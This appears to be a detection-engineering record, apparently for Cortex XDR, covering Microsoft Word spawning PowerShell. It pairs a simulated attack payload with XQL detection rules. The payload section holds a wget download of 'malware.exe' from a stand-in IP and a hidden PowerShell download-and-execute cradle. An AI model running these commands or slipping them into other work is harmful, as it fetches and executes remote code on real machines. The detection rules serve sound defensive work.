identity.description: An attacker uses Microsoft Word to launch a malicious PowerShell script that downloads and executes a payload from a remote C2 server. Cortex detects this behavior as suspicious when Office spawns a commonly abused process like PowerShell or WMI.

payload.code:
cd C:\temp
wget http://192.0.2.10/malware.exe -OutFile malware.exe
stub malware.exe
powershell.exe -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString('http://192.0.2.10/launcher.ps1')"

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: Microsoft Office spawns PowerShell
biocs.description: Detection of winword.exe or excel.exe spawning powershell.exe
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = 'winword.exe' and action_process_image_name = 'powershell.exe'

abiocs.name: Office process spawns commonly abused process
abiocs.description: Detection of Microsoft Office applications spawning PowerShell, WMI, or other commonly abused processes
abiocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name in ('winword.exe', 'excel.exe') and action_process_image_name in ('powershell.exe', 'wmi.exe', 'wmic.exe')

xql_queries.name: Detect Office spawning PowerShell
xql_queries.query:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name in ('winword.exe', 'excel.exe') and action_process_image_name = 'powershell.exe'
| fields actor_process_image_name, action_process_image_name, agent_hostname
